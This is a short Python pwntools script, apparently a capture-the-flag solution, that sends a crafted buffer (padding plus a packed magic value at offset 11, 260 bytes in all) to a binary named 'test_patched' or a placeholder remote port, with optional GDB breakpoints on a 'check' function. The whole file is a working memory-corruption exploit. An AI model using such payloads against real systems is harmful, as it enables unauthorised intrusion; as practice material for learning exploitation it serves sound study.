#!/usr/bin/env python3

from pwn import *

exe = ELF("./test_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, """
                b * check
                b * check + 91
                c   
                       """)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    payload = flat(
        "A" * 11,
        p32(0x49693121),
        "A" * (260 - 11 - 4)
    )
    r.sendlineafter("pwner:\n", payload)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
